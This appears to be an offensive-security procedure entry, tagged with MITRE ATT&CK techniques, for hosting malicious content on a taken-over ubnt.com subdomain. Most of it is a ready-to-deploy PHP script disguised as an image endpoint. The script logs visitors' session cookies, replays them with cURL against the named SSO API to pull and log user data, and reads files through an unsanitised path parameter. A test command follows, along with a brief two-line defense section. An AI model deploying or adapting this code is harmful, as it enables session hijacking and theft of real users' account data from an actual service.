---
id: proc-host-content-ubnt
tags:
  - php
  - malware-hosting
  - cookie-logging
type: procedure
tools:
  - '[[tools/PHP]]'
  - '[[tools/cURL]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T17:31:43.061Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Host-Malicious-Content-on-Taken-Over-Subdomain

## Summary

Deploy server-side scripts on the controlled subdomain to log incoming cookies and proxy requests to victim services.

## Description

After takeover, host a PHP endpoint that captures the UBIC_AUTH cookie from requests and uses cURL to query the SSO API, enabling data exfiltration.

## Requirements

1. Web server (Apache/Nginx) on origin with PHP
2. Write access to log files
3. cURL library enabled

## Defense

Defensive measures and detection strategies:

- Implement cookie partitioning (e.g., domain-specific scopes)
- Monitor for anomalous traffic to subdomains via WAF

## Objectives

1. Capture shared session cookies
2. Proxy and exfiltrate user data
3. Verify PoC with benign HTML

## Instructions

### Step 1: Deploy PHP Logger

**Context**: Create imagefetch.php to handle image requests and log cookies.

Upload script:
```php
<?php
header('Content-Type: image/png');
$cookie = $_SERVER['HTTP_COOKIE'];
file_put_contents('/var/log/cookies.log', date('Y-m-d H:i:s') . ' - ' . $cookie . "\n", FILE_APPEND);
$f = $_GET['f'] ?? 'default.png';
$ch = curl_init("https://sso.ubnt.com/api/sso/v1/user/self");
curl_setopt($ch, CURLOPT_COOKIE, $cookie);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
file_put_contents('/var/log/responses.log', $response . "\n", FILE_APPEND);
readfile("images/{$f}");
?>
```

> Serves disguised image while logging; expected: Cookie and API data in logs.

### Step 2: Test Hosting

**Context**: Verify endpoint accessibility.

```bash
curl https://ping.ubnt.com/imagefetch.php?f=thanks.png
```

> Returns PNG; check logs for entries.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Remote File Copy]] Ingress Tool Transfer

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/PHP]]
- [[tools/cURL]]

## Tags

- php
- hosting
